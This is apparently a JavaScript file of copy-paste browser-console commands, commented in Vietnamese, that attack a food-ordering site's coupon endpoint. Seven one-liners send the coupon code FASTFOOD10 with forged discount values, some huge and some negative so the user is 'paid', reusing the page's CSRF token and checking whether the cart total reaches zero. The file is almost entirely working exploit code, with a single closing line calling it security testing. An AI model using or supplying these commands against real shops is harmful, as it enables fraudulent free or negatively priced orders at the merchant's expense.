// 🚨 QUICK CONSOLE HACK - COPY PASTE TỪNG LỆNH
// Mở F12 → Console → Copy paste từng lệnh dưới đây

// ========================================
// 🎯 LỆNH 1: HACK 999 TRIỆU (ONE-LINER)
// ========================================
fetch('/coupon/apply', {method: 'POST', headers: {'Content-Type': 'application/json', 'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content}, body: JSON.stringify({coupon_code: 'FASTFOOD10', discount: 999999999})}).then(r=>r.json()).then(d=>d.success ? alert('🚨 HACK THÀNH CÔNG! Discount: ' + d.discount.toLocaleString('vi-VN') + 'đ') : alert('❌ Hack thất bại'));

// ========================================
// 🎯 LỆNH 2: HACK NEGATIVE - USER ĐƯỢC TRẢ TIỀN
// ========================================
fetch('/coupon/apply', {method: 'POST', headers: {'Content-Type': 'application/json', 'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content}, body: JSON.stringify({coupon_code: 'FASTFOOD10', discount: -10000000})}).then(r=>r.json()).then(d=>d.success && d.discount < 0 ? alert('🚨 BẠN ĐƯỢC TRẢ: ' + Math.abs(d.discount).toLocaleString('vi-VN') + 'đ') : alert('❌ Negative hack thất bại'));

// ========================================
// 🎯 LỆNH 3: CHECK CART TOTAL
// ========================================
fetch('/cart').then(r=>r.text()).then(h=>{const m=h.match(/Tổng cộng[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i); if(m){const t=parseInt(m[1].replace(/\./g,'')); alert('💵 Cart total: '+t.toLocaleString('vi-VN')+'đ'+(t<=0?' - CÓ THỂ ĐẶT HÀNG MIỄN PHÍ!':''))}});

// ========================================
// 🎯 LỆNH 4: FULL AUTO HACK
// ========================================
(async()=>{const t=document.querySelector('meta[name="csrf-token"]').content;const r=await fetch('/coupon/apply',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':t},body:JSON.stringify({coupon_code:'FASTFOOD10',discount:999999999})});const d=await r.json();if(d.success){const c=await fetch('/cart');const h=await c.text();const m=h.match(/Tổng cộng[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i);const total=m?parseInt(m[1].replace(/\./g,'')):0;alert(`🚨 HACK HOÀN THÀNH!\n💰 Discount: ${d.discount.toLocaleString('vi-VN')}đ\n💵 Cart: ${total.toLocaleString('vi-VN')}đ${total<=0?' - MIỄN PHÍ!':''}`)}else alert('❌ Hack thất bại')})();

// ========================================
// 🎯 LỆNH 5: TEST MULTIPLE VALUES
// ========================================
[999999999, -5000000, 0.01, 1000000000].forEach((v,i)=>setTimeout(()=>fetch('/coupon/apply',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-TOKEN':document.querySelector('meta[name="csrf-token"]').content},body:JSON.stringify({coupon_code:'FASTFOOD10',discount:v})}).then(r=>r.json()).then(d=>console.log(`Test ${i+1} (${v}):`,d.success?'✅ SUCCESS - '+d.discount.toLocaleString('vi-VN')+'đ':'❌ FAILED')),i*1000));

// ========================================
// 🎯 LỆNH 6: EXTREME HACK (1 TỶ VNĐ)
// ========================================
fetch('/coupon/apply', {method: 'POST', headers: {'Content-Type': 'application/json', 'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content}, body: JSON.stringify({coupon_code: 'FASTFOOD10', discount: 1000000000})}).then(r=>r.json()).then(d=>d.success ? alert('🚨 EXTREME HACK! Discount: ' + d.discount.toLocaleString('vi-VN') + 'đ') : console.log('Failed:', d));

// ========================================
// 🎯 LỆNH 7: PROFIT HACK (User kiếm tiền)
// ========================================
fetch('/coupon/apply', {method: 'POST', headers: {'Content-Type': 'application/json', 'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content}, body: JSON.stringify({coupon_code: 'FASTFOOD10', discount: -50000000})}).then(r=>r.json()).then(d=>d.success && d.discount < 0 ? alert('💰 PROFIT HACK! Bạn kiếm được: ' + Math.abs(d.discount).toLocaleString('vi-VN') + 'đ') : console.log('Profit hack failed:', d));

console.log(`
🚨 QUICK HACK COMMANDS LOADED!
==============================
Copy paste từng lệnh ở trên để hack coupon.

📋 DANH SÁCH LỆNH:
1. Hack 999 triệu VNĐ
2. Hack negative (user được trả tiền)  
3. Check cart total
4. Full auto hack
5. Test multiple values
6. Extreme hack (1 tỷ VNĐ)
7. Profit hack (user kiếm tiền)

⚠️ CHỈ SỬ DỤNG ĐỂ TEST BẢO MẬT!
`); 